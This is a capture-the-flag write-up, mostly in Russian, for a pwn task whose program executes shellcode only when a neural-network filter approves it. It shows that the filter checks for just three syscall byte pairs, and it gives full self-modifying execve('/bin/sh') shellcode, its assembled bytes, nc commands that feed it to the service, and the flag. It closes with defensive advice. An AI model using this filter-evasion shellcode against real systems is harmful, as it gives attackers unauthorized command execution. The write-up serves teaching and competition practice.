---
title: "filter"
ctf: "Кубок CTF 2026"
author: "anci31d"
date: 2026-10-31
category: pwn
difficulty: easy
points: 100
flag_format: "ctfcup{...}"
---

# filter

**Techniques:** shellcode, static byte filter bypass, self-modifying code  
**Verification status:** verified locally and on the live task instance

## Prerequisites

- базовый x86-64 assembly и Linux syscall ABI;
- понимание формата бинарного ввода;
- умение собрать и запустить C-программу;
- знание того, что память с правами `RWX` одновременно доступна для записи и исполнения.

## Summary

Программа принимает бинарный shellcode в формате `[4-byte little-endian length][bytes]`, вычисляет для него score нейросетевым фильтром и исполняет код, если score не больше нуля. Нужно обойти фильтр и прочитать флаг.

## Solution

### Setup

Соберите цель из приложенного архива:

```bash
make
```

Сохраните показанный ниже payload в `shellcode.S` и соберите его:

```bash
as --64 -o shellcode.o shellcode.S
objcopy -O binary -j .text shellcode.o shellcode.bin
```

Проверить саму модель:

```bash
python3 gen_model.py
```

Ожидается строка:

```text
[selftest] mismatches=0
```

## Hint ladder

1. Посмотрите, какие байты модель действительно извлекает из embedding.
2. Сравните условие допуска с правами памяти, которые получает `mmap`.
3. Фильтр ищет три конкретные пары соседних байтов.
4. Запишите запрещённые байты в память уже после проверки.
5. Перед проверкой отправьте код, который меняет два `NOP` на `0f 05`, а затем передаёт управление на них.

## Analysis: how to find the bug

В `main` длина читается как `unsigned int` и ограничивается `0x1000`:

```c
if (len == 0 || len > MAX_LEN)
    return 1;
```

Затем программа выделяет память с правами чтения, записи и исполнения:

```c
unsigned char *code = mmap(
    NULL, MAX_LEN,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
);
```

Введённые байты сначала полностью анализируются:

```c
float score = guard_score(code, (int)len);
```

А после успешной проверки исполняются из того же буфера:

```c
((void (*)(void))code)();
```

Это сразу даёт важный вопрос: можно ли передать код, который выглядит безвредно для модели, но во время исполнения изменит собственные байты?

### Что именно проверяет модель

В `gen_model.py` явно указаны запрещённые пары:

```python
FORBIDDEN = {
    (0x0f, 0x05),  # syscall
    (0xcd, 0x80),  # int 0x80
    (0x0f, 0x34),  # sysenter
}
```

`GUARD_RELBIAS` усиливает внимание к предыдущему байту, а три FFN-gate проверяют соответственно `0f 05`, `cd 80` и `0f 34`. Следовательно, модель не ищет все возможные опасные инструкции и не исполняет код: она фактически проверяет наличие только этих трёх биграмм.

Важная граница: проверка выполняется один раз до передачи управления shellcode. После неё код всё ещё находится в записываемой и исполняемой памяти.

## The vulnerability

Уязвимость состоит в рассинхронизации между защитой и исполнением:

1. Защита проверяет начальное содержимое буфера.
2. Буфер имеет право записи.
3. После проверки тот же буфер исполняется.

Атакующий контролирует весь буфер длиной до `0x1000` байт. Поэтому можно передать инструкции, в которых нет запрещённых последовательностей, записать запрещённые байты в `syscall_site`, а затем перейти туда.

Получаемый примитив: выполнение произвольного shellcode при условии, что его начальная версия не содержит трёх обнаруживаемых биграмм.

## Exploit design

Использованный shellcode делает следующее:

1. Записывает `0x0f` и `0x05` в два байта `syscall_site`.
2. Обнуляет `rdx` и `rsi`, чтобы передать `argv = NULL` и `envp = NULL`.
3. Загружает адрес строки `/bin/sh` в `rdi`.
4. Загружает номер Linux syscall `execve`, равный `59`, в `rax`.
5. Переходит в изменённые байты `syscall_site`.

Исходный участок содержит `90 90`, то есть два `NOP`, поэтому в отправляемом буфере нет пары `0f 05`:

```asm
syscall_site:
    .byte 0x90, 0x90
```

До запуска модель видит только `90 90`. Инструкции `mov byte ptr [...]` заменяют эти байты уже после вычисления score.

Полный payload:

```asm
.intel_syntax noprefix
.global _start
.section .text
_start:
    mov byte ptr [rip + syscall_site], 0x0f
    mov byte ptr [rip + syscall_site + 1], 0x05

    xor edx, edx
    xor esi, esi
    lea rdi, [rip + binsh]
    xor eax, eax
    mov al, 59
    jmp syscall_site

syscall_site:
    .byte 0x90, 0x90

binsh:
    .asciz "/bin/sh"
```

Почему работают RIP-relative адреса: shellcode не знает адрес, по которому `mmap` разместит буфер. Инструкции `mov [rip + ...]` и `lea [rip + ...]` вычисляют адреса относительно текущего instruction pointer и поэтому не требуют фиксированных адресов.

## Solver walkthrough

Сборка payload:

```bash
as --64 -o shellcode.o shellcode.S
objcopy -O binary -j .text shellcode.o shellcode.bin
```

Получившиеся 41 байт:

```text
c605180000000fc605120000000531d231f6488d3d0800000031c0b03beb0090902f62696e2f736800
```

Первые две инструкции имеют машинные байты:

```text
c6 05 18 00 00 00 0f
c6 05 12 00 00 00 05
```

Они записывают байты в offsets `0x1f` и `0x20`, где лежат два `NOP`.

Перед отправкой длина кодируется как little-endian `uint32_t`:

```text
41 = 0x29
length prefix = 29 00 00 00
```

## Reproduce it yourself

Локальная отправка в собранную программу:

```bash
{ printf '\x29\x00\x00\x00'; cat shellcode.bin; printf 'id\nprintf "PAYLOAD_OK\n"\nexit\n'; } | ./filter
```

Ожидаемый ключевой вывод:

```text
[*] guard verdict: score = -10.000
[+] looks harmless to me. Executing...
uid=...
PAYLOAD_OK
```

Для live-инстанса используется тот же бинарный payload:

```bash
{ printf '\x29\x00\x00\x00'; cat shellcode.bin; printf 'cat /flag.txt\n'; } \
  | nc <instance-host> <port>
```

В нашем проверенном запуске gateway принял токен инстанса, программа вывела `score = -10.000`, shellcode запустил `/bin/sh`, а чтение `/flag.txt` вернуло:

```text
ctfcup{3f3f3558d1484e50275a5e354d7816bd_733cef8ad5480aa3}
```

## What I changed to confirm understanding

Проверка модели через Python дала:

```text
length=41 score=-10.000000 oracle=False
```

Локальная программа подтвердила, что payload проходит фильтр и действительно исполняется.

Если заменить `.byte 0x90, 0x90` на `.byte 0x0f, 0x05`, фильтр увидит запрещённую пару и заблокирует payload. Если оставить `NOP` и не выполнять self-modification, системный вызов не произойдёт. Это подтверждает, что существенны обе части: отсутствие биграммы до проверки и запись настоящего `syscall` после неё.

## Generalization

Такой баг следует искать, когда защитный анализ и исполнение используют один изменяемый буфер. Особенно подозрительно сочетание:

- `mmap` или `mprotect` с `PROT_WRITE | PROT_EXEC`;
- статический фильтр, checksum или сигнатурная проверка;
- последующий вызов буфера как функции;
- отсутствие повторной проверки или снятия права записи.

В реальной защите нужно разделять память с кодом и память с данными, применять W^X, запрещать self-modifying code и проверять фактически исполняемый код. Простая сигнатурная проверка нескольких инструкций не заменяет sandbox или seccomp.

Частая ошибка при решении: отправить обычный shellcode с `0f 05` и пытаться подобрать score. Здесь проще сначала выписать точный oracle из модели, а затем изменить байты после проверки.

Локальная модель подтвердила `mismatches=0`, а payload прошёл с score `-10.000`. Для live-инстанса требуется только заменить `<instance-host> <port>` в команде выше; серверная обвязка в архиве задачи не поставлялась.

## Flag

```text
ctfcup{3f3f3558d1484e50275a5e354d7816bd_733cef8ad5480aa3}
```
